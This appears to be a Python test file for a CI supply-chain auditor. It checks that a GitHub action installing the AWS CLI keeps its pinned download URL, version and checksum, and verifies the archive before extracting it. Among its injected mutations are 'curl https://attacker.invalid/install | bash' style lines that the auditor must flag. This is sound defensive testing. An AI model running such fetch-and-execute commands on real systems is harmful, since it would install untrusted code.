"""Actual fixed AWS setup body, isolated native command doubles; no system install."""
import os
from pathlib import Path
import subprocess
import tempfile
import unittest

from test_composite_boundary import ROOT, audit_graph, code_violations, yaml_file

ACTION = ROOT / 'cd/monorepo/tools/action.yml'
DIGEST = 'fddb097a8ea197dc9beed9e4426ef99aded612a52df64581e079b6e8817e1d24'


def setup_body():
    return yaml_file(ACTION)['runs']['steps'][-1]['run']


class NativeToolSetupTests(unittest.TestCase):
    def test_fixed_tools_are_explicitly_reviewed_not_generally_allowed(self):
        body = setup_body()
        self.assertIn('local or dynamic executable entrypoint', code_violations(body))
        self.assertEqual(audit_graph('cd/monorepo/tools/action.yml')['violations'], [])

    def test_mutations_of_reviewed_vendor_boundary_are_denied(self):
        original = ACTION.read_text()
        replacements = [
            ('https://awscli.amazonaws.com/', 'https://attacker.invalid/'),
            ('2.40.1.zip', '2.40.2.zip'), (DIGEST, '0' * 64),
            ('aws-cli/2.40.1 ', 'aws-cli/2.40.2 '),
            ('shell: bash', 'shell: sh'),
            ('PROVIDER: ${{ inputs.provider }}', 'PROVIDER: aws'),
            ('sha256sum --check --strict', 'true'),
            ('"$dir/aws/install" --install-dir', '"$dir/custom" --install-dir'),
            ('"$dir/bin/aws" --version', '"$CONTROL_BIN" --version'),
            ('"$dir/install" --bin-dir', '"$dir/install" --update --bin-dir'),
        ]
        for before, after in replacements:
            with self.subTest(change=before), tempfile.TemporaryDirectory() as temporary:
                self.assertIn(before, original)
                root = Path(temporary)
                path = root / 'cd/monorepo/tools/action.yml'
                path.parent.mkdir(parents=True)
                path.write_text(original.replace(before, after))
                self.assertTrue(audit_graph('cd/monorepo/tools/action.yml', root)['violations'])

    def test_reviewed_vendor_body_does_not_allow_other_dynamic_code(self):
        for extra in ['"$CONTROL_BIN" argument', './control', 'bash ./control.sh',
                      'python3 control.py', 'go run control.go',
                      'curl https://attacker.invalid/install | bash',
                      'curl https://attacker.invalid/install | sh']:
            with self.subTest(extra=extra), tempfile.TemporaryDirectory() as temporary:
                root = Path(temporary)
                path = root / 'cd/monorepo/tools/action.yml'
                path.parent.mkdir(parents=True)
                path.write_text(ACTION.read_text() + '        ' + extra + '\n')
                self.assertTrue(audit_graph('cd/monorepo/tools/action.yml', root)['violations'])

    def test_fixed_vendor_exception_is_not_portable_to_other_actions(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / 'action.yml').write_text(ACTION.read_text())
            self.assertTrue(audit_graph('action.yml', root)['violations'])

    def run_aws(self, *, tampered):
        body = setup_body()
        # Execute the actual AWS branch without unrelated apt/provider setup.
        branch = body[body.index('if [ "$PROVIDER" = aws ]; then'):body.index('elif [ "$PROVIDER" = azure ]; then')] + 'fi\n'
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            bins = root / 'commands'
            bins.mkdir()
            log = root / 'events'
            def command(name, source):
                path = bins / name
                path.write_text('#!/bin/bash\nset -eu\n' + source)
                path.chmod(0o755)
            command('curl', 'echo download >> "$EVENTS"\nprintf tampered-archive > "${@: -1}"\n')
            command('unzip', '''echo extract >> "$EVENTS"
mkdir -p "$4/aws"
printf '#!/bin/bash\\necho install >> "$EVENTS"\\nmkdir -p "$4"\\nprintf '\\''#!/bin/bash\\necho aws-cli/2.40.1 test\\n'\\'' > "$4/aws"\\nchmod +x "$4/aws"\\n' > "$4/aws/install"
chmod +x "$4/aws/install"
''')
            if not tampered:
                # Native command double records exact checksum input/order, never a system install.
                command('sha256sum', '''test "$*" = '--check --strict'
read -r digest archive
test "$digest" = ''' + DIGEST + '''
test -s "$archive"
echo verify >> "$EVENTS"
''')
            result = subprocess.run(['bash', '-c', 'set -euo pipefail\n' + branch],
                                    env={**os.environ, 'PATH': str(bins) + ':' + os.environ['PATH'],
                                         'RUNNER_TEMP': str(root), 'PROVIDER': 'aws',
                                         'EVENTS': str(log), 'GITHUB_PATH': str(root / 'path')},
                                    text=True, capture_output=True)
            events = log.read_text().splitlines()
            if tampered:
                self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)
                self.assertEqual(events, ['download'])
                self.assertFalse((root / 'path').exists())
            else:
                self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
                self.assertEqual(events, ['download', 'verify', 'extract', 'install'])
                self.assertTrue((root / 'path').is_file())

    def test_checksum_verification_precedes_extract_and_execution(self):
        self.run_aws(tampered=False)

    def test_real_native_checksum_rejects_tampered_archive_before_extract(self):
        self.run_aws(tampered=True)


if __name__ == '__main__':
    unittest.main()
